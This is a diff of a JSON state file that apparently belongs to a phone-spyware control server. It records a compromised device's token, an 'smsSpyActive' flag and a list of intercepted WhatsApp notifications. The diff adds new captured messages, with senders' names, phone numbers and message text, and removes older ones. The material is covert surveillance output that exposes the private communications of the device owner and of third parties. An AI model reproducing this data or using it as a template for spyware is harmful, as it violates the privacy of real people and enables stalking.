@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776954510252,
+    "lastSeen": 1776954527956,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎70 pesan dari 41 chat",
+        "time": "23/04 22:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776954529100
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎77 pesan dari 41 chat",
+        "time": "23/04 22:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776954513616
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Oi (16 pesan): BEW STORE",
+        "content": "🚩 List not found.\n\n> https://whatsapp.com/channel/0029Vb610enId7nWJHmxu118",
+        "time": "23/04 22:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776954513596
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Oi (15 pesan): Nakan",
+        "content": ".list member",
+        "time": "23/04 22:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776954513128
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -3987,38 +4019,6 @@
         "time": "23/04 20:03",
         "pkg": "com.whatsapp",
         "receivedAt": 1776945830393
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 822-6965-3769",
-        "content": "sipp",
-        "time": "23/04 20:03",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776945830042
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎66 pesan dari 43 chat",
-        "time": "23/04 20:03",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776945820350
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 858-3608-9495",
-        "content": "40",
-        "time": "23/04 20:03",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776945820063
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎65 pesan dari 42 chat",
-        "time": "23/04 20:03",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776945800003
       }
     ],
     "galleryPhotos": [],
